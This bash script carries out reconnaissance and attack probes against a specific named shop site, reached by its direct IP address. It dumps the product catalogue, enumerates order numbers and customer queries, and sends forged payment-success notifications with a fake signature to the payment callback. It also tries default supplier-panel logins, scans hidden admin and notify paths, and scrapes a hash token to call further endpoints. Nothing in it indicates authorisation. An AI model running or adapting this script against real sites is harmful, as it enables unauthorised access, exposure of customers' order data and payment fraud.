#!/bin/bash
# Deep probe via direct IP (site has intermittent SSL issues)
IP="103.43.11.95"
HOST="tianyu9080.top"
BASE="https://${IP}/shop"
OUT="/workspace/tianyu9080-recon/deep"
JAR="$OUT/c.jar"
HDR=(-sk -4 --connect-timeout 10 --max-time 20
  -H "Host: ${HOST}"
  -H "Referer: https://${HOST}/shop/"
  -H "X-Requested-With: XMLHttpRequest"
  -b "$JAR" -c "$JAR")

curl_req() {
  local url="$1" method="${2:-GET}" data="$3" outfile="$4"
  for i in 1 2 3 4 5; do
    if [ "$method" = "POST" ]; then
      resp=$(curl "${HDR[@]}" -X POST -d "$data" "$url" 2>/dev/null) && { [ -n "$outfile" ] && echo "$resp" > "$outfile"; echo "$resp"; return 0; }
    else
      resp=$(curl "${HDR[@]}" "$url" 2>/dev/null) && { [ -n "$outfile" ] && echo "$resp" > "$outfile"; echo "$resp"; return 0; }
    fi
    sleep 1
  done
  echo "FAIL"
  return 1
}

mkdir -p "$OUT"
# bootstrap
curl "${HDR[@]}" "https://${IP}/shop/" -o /dev/null 2>/dev/null || true
sleep 1

echo "=== getcount ==="
curl_req "${BASE}/ajax.php?act=getcount"

echo ""
echo "=== getclass ==="
curl_req "${BASE}/ajax.php?act=getclass" GET "" "$OUT/getclass.json"
CIDS=$(python3 -c "import json;d=json.load(open('$OUT/getclass.json'));print(' '.join(c['cid'] for c in d.get('data',[])))" 2>/dev/null)
echo "cids: $CIDS"

echo ""
echo "=== dump products ==="
ALL="$OUT/all_products.json"
echo '{"data":[' > "$ALL"
first=1
total=0
for cid in $CIDS; do
  sleep 0.4
  f="$OUT/gettool_cid${cid}.json"
  body=$(curl_req "${BASE}/ajax.php?act=gettool&cid=${cid}" GET "" "$f")
  n=$(python3 -c "import json;d=json.load(open('$f'));print(len(d.get('data',[])))" 2>/dev/null || echo 0)
  total=$((total + n))
  echo "  cid=$cid -> $n products"
  if [ "$first" = 1 ]; then
    python3 -c "import json;d=json.load(open('$f'));import sys;[sys.stdout.write(json.dumps(x,ensure_ascii=False)+',') for x in d.get('data',[])]" >> "$ALL" 2>/dev/null
    first=0
  else
    python3 -c "import json;d=json.load(open('$f'));import sys;[sys.stdout.write(','+json.dumps(x,ensure_ascii=False)) for x in d.get('data',[])]" >> "$ALL" 2>/dev/null
  fi
done
echo '],"total":'"$total"'}' >> "$ALL"
# fix json - simpler approach: use python merge
python3 << 'PY'
import json, glob, os
out = "/workspace/tianyu9080-recon/deep"
allp = []
for f in sorted(glob.glob(f"{out}/gettool_cid*.json")):
    try:
        d = json.load(open(f))
        allp.extend(d.get("data", []))
    except: pass
json.dump({"total": len(allp), "data": allp}, open(f"{out}/all_products.json","w"), ensure_ascii=False, indent=2)
# stats
faka = [p for p in allp if p.get("isfaka")==1]
with_stock = [p for p in allp if p.get("stock") not in (None, "", "null")]
print(f"TOTAL products: {len(allp)}, isfaka=1: {len(faka)}, with stock field: {len(with_stock)}")
# top stock
stocks = [(p.get("tid"), p.get("name","")[:40], p.get("price"), p.get("stock")) for p in allp if isinstance(p.get("stock"), (int,float)) or (isinstance(p.get("stock"), str) and p.get("stock").isdigit())]
stocks.sort(key=lambda x: int(x[3]) if str(x[3]).isdigit() else 0, reverse=True)
for s in stocks[:10]:
    print(f"  tid={s[0]} stock={s[3]} price={s[2]} {s[1]}")
PY

echo ""
echo "=== gettoolnew ==="
curl_req "${BASE}/ajax.php?act=gettoolnew" GET "" "$OUT/gettoolnew.json" | head -c 200; echo

echo ""
echo "=== trade_no enum ==="
> "$OUT/trade_no_enum.json"
echo "{" >> "$OUT/trade_no_enum.json"
first=1
for tn in 37416 37415 37414 37410 37400 37300 1000 1 20250710 20250715 202507111234 20250711123456; do
  sleep 0.3
  r=$(curl_req "${BASE}/other/getshop.php?trade_no=${tn}")
  [ "$first" = 0 ] && echo "," >> "$OUT/trade_no_enum.json"
  first=0
  echo -n "  \"$tn\": $(echo "$r" | python3 -c 'import json,sys;print(json.dumps(sys.stdin.read()[:300]))')" >> "$OUT/trade_no_enum.json"
  echo "  $tn -> $r"
done
echo "" >> "$OUT/trade_no_enum.json"
echo "}" >> "$OUT/trade_no_enum.json"

echo ""
echo "=== findorder/orderinfo ==="
for act in findorder orderinfo queryorder; do
  r=$(curl_req "${BASE}/ajax.php?act=${act}" POST "trade_no=37416")
  echo "  $act: $r"
done

echo ""
echo "=== epay_notify ==="
curl_req "${BASE}/other/epay_notify.php?pid=1&trade_no=37416&out_trade_no=T1&type=alipay&money=1.00&trade_status=TRADE_SUCCESS&sign=fake"
echo ""
curl_req "${BASE}/other/epay_notify.php" POST "pid=1&trade_no=37416&out_trade_no=T1&type=alipay&money=1.00&trade_status=TRADE_SUCCESS&sign=fake"

echo ""
echo "=== sup ajax ==="
for act in login getcount goodslist orderlist stock km; do
  r=$(curl_req "${BASE}/sup/ajax.php?act=${act}" POST "user=test&pass=test")
  echo "  sup/$act: ${r:0:80}"
done

echo ""
echo "=== hidden paths ==="
for p in other/notify.php other/return.php other/usdt_notify.php cron.php admin/ user/ajax.php; do
  code=$(curl -sk -4 --connect-timeout 8 --max-time 12 -H "Host: ${HOST}" -o /dev/null -w "%{http_code}" "${BASE}/${p}" 2>/dev/null || echo 000)
  echo "  /$p -> $code"
done

echo ""
echo "=== query enumeration ==="
for data in 13800138000 test@test.com 37416 admin; do
  body=$(curl -sk -4 --connect-timeout 8 --max-time 15 -H "Host: ${HOST}" -b "$JAR" "${BASE}/?mod=query&data=${data}" 2>/dev/null)
  cnt=$(echo "$body" | grep -o 'showOrder(' | wc -l)
  echo "  query data=$data showOrder_count=$cnt"
done

echo ""
echo "=== getshuoshuo/getrizhi ==="
HASH=$(curl -sk -4 -H "Host: ${HOST}" "https://${IP}/shop/" 2>/dev/null | grep -oP "hashsalt\s*=\s*'\K[^']+" | head -1)
echo "hashsalt=${HASH:0:20}..."
for uin in 10000 123456789; do
  r=$(curl_req "${BASE}/ajax.php?act=getshuoshuo&uin=${uin}&page=1&hashsalt=${HASH}")
  echo "  getshuoshuo $uin: ${r:0:100}"
  r=$(curl_req "${BASE}/ajax.php?act=getrizhi&uin=${uin}&page=1&hashsalt=${HASH}")
  echo "  getrizhi $uin: ${r:0:100}"
done

echo ""
echo "DONE"
